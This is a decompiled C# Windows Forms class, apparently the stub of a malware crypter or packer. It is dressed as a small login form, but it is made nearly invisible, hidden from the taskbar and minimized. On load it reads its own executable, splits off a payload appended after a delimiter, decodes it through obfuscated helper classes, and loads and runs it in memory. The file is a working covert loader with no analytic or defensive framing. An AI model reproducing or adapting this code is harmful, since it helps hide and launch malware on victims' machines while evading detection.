using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace micromini;

[DesignerGenerated]
public class Mini : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Panel1")]
	private Panel panel_0;

	[AccessedThroughProperty("Button1")]
	private Button button_0;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox checkBox_0;

	[AccessedThroughProperty("Label1")]
	private Label label_0;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar progressBar_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	public Mini()
	{
		((Form)this).add_Load((EventHandler)Mini_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		vmethod_1(new Panel());
		vmethod_11(new TextBox());
		vmethod_9(new ProgressBar());
		vmethod_7(new Label());
		vmethod_5(new CheckBox());
		vmethod_3(new Button());
		((Control)vmethod_0()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)vmethod_0()).get_Controls().Add((Control)(object)vmethod_2());
		((Control)vmethod_0()).get_Controls().Add((Control)(object)vmethod_4());
		((Control)vmethod_0()).get_Controls().Add((Control)(object)vmethod_6());
		((Control)vmethod_0()).get_Controls().Add((Control)(object)vmethod_8());
		((Control)vmethod_0()).get_Controls().Add((Control)(object)vmethod_10());
		Panel obj = vmethod_0();
		Point location = new Point(10, 11);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("Panel1");
		Panel obj2 = vmethod_0();
		Size size = new Size(338, 133);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		TextBox obj3 = vmethod_10();
		location = new Point(13, 14);
		((Control)obj3).set_Location(location);
		((Control)vmethod_10()).set_Name("TextBox1");
		TextBox obj4 = vmethod_10();
		size = new Size(158, 20);
		((Control)obj4).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(0);
		ProgressBar obj5 = vmethod_8();
		location = new Point(13, 43);
		((Control)obj5).set_Location(location);
		((Control)vmethod_8()).set_Name("ProgressBar1");
		ProgressBar obj6 = vmethod_8();
		size = new Size(157, 23);
		((Control)obj6).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(1);
		vmethod_6().set_AutoSize(true);
		Label obj7 = vmethod_6();
		location = new Point(224, 25);
		((Control)obj7).set_Location(location);
		((Control)vmethod_6()).set_Name("Label1");
		Label obj8 = vmethod_6();
		size = new Size(26, 13);
		((Control)obj8).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(2);
		vmethod_6().set_Text("texy");
		((ButtonBase)vmethod_4()).set_AutoSize(true);
		CheckBox obj9 = vmethod_4();
		location = new Point(249, 110);
		((Control)obj9).set_Location(location);
		((Control)vmethod_4()).set_Name("CheckBox1");
		CheckBox obj10 = vmethod_4();
		size = new Size(77, 17);
		((Control)obj10).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(3);
		((ButtonBase)vmethod_4()).set_Text("Remember");
		((ButtonBase)vmethod_4()).set_UseVisualStyleBackColor(true);
		Button obj11 = vmethod_2();
		location = new Point(25, 87);
		((Control)obj11).set_Location(location);
		((Control)vmethod_2()).set_Name("Button1");
		Button obj12 = vmethod_2();
		size = new Size(172, 23);
		((Control)obj12).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(4);
		((ButtonBase)vmethod_2()).set_Text("Login");
		((ButtonBase)vmethod_2()).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(358, 150);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)vmethod_0()).ResumeLayout(false);
		((Control)vmethod_0()).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	internal virtual Panel vmethod_0()
	{
		return panel_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_1(Panel panel_1)
	{
		panel_0 = panel_1;
	}

	internal virtual Button vmethod_2()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_3(Button button_1)
	{
		button_0 = button_1;
	}

	internal virtual CheckBox vmethod_4()
	{
		return checkBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_5(CheckBox checkBox_1)
	{
		checkBox_0 = checkBox_1;
	}

	internal virtual Label vmethod_6()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_7(Label label_1)
	{
		label_0 = label_1;
	}

	internal virtual ProgressBar vmethod_8()
	{
		return progressBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_9(ProgressBar progressBar_1)
	{
		progressBar_0 = progressBar_1;
	}

	internal virtual TextBox vmethod_10()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	internal virtual void vmethod_11(TextBox textBox_1)
	{
		textBox_0 = textBox_1;
	}

	private void Mini_Load(object sender, EventArgs e)
	{
		string[] array = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "!\\!", -1, (CompareMethod)0);
		Type type = AppDomain.CurrentDomain.Load(Class5.smethod_0(84, Class7.smethod_3(), array[1])).GetTypes()[7];
		Activator.CreateInstance(type);
	}
}
